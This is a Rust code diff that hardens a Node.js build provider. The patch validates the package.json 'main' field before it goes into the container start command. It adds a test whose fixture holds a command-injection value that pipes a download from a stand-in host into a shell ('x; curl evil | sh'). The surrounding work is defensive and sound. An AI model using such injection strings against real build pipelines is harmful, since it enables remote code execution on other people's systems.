@@ -18,17 +18,29 @@ impl NodeProvider {
         }
     }
 
-    fn detect_start_command(ctx: &AppContext, pm: &PackageManager) -> Option<String> {
-        let pkg = ctx.read_file("package.json").ok()?;
-        let parsed: serde_json::Value = serde_json::from_str(&pkg).ok()?;
-        let scripts = parsed.get("scripts")?;
+    fn detect_start_command(ctx: &AppContext, pm: &PackageManager) -> Result<Option<String>> {
+        let Ok(pkg) = ctx.read_file("package.json") else {
+            return Ok(None);
+        };
+        let Ok(parsed) = serde_json::from_str::<serde_json::Value>(&pkg) else {
+            return Ok(None);
+        };
+        let Some(scripts) = parsed.get("scripts") else {
+            return Ok(None);
+        };
 
         if scripts.get("start").is_some() {
-            return Some(format!("{} start", pm.run_prefix()));
+            return Ok(Some(format!("{} start", pm.run_prefix())));
         }
 
-        let main = parsed.get("main")?.as_str()?;
-        Some(format!("node {main}"))
+        // `main` is attacker-controlled repo metadata that lands in the runtime
+        // `CMD`, so validate it before interpolation to block command injection
+        if let Some(main) = parsed.get("main").and_then(|m| m.as_str()) {
+            crate::sanitize::validate_token("package.json main", main)?;
+            return Ok(Some(format!("node {main}")));
+        }
+
+        Ok(None)
     }
 
     fn has_build_script(ctx: &AppContext) -> bool {
@@ -153,13 +165,13 @@ impl Provider for NodeProvider {
         // A Next.js static export builds to out/ and cannot be run with
         // `next start`; serve the exported files statically instead.
         let is_static_export = has_build && Self::is_next_static_export(ctx);
-        let start_cmd = ctx.overrides.start_command.clone().or_else(|| {
-            if is_static_export {
-                Some("serve out -l 3000".to_string())
-            } else {
-                Self::detect_start_command(ctx, &pm)
-            }
-        });
+        let start_cmd = if let Some(override_cmd) = ctx.overrides.start_command.clone() {
+            Some(override_cmd)
+        } else if is_static_export {
+            Some("serve out -l 3000".to_string())
+        } else {
+            Self::detect_start_command(ctx, &pm)?
+        };
 
         let base_image = "node:22-slim".to_string();
         let build_image = "node:22".to_string();
@@ -356,6 +368,21 @@ mod tests {
             "yarn" => std::fs::write(dir.join("yarn.lock"), "").unwrap(),
             _ => {}
         }
+    }
+
+    #[test]
+    fn rejects_injection_in_package_main() {
+        let dir = tempfile::tempdir().unwrap();
+        std::fs::write(
+            dir.path().join("package.json"),
+            r#"{"name":"t","scripts":{},"main":"x; curl evil | sh"}"#,
+        )
+        .unwrap();
+        let ctx = AppContext::new(dir.path()).unwrap();
+        assert!(
+            NodeProvider.plan(&ctx).is_err(),
+            "shell metachars in package.json main must be rejected"
+        );
     }
 
     #[test]
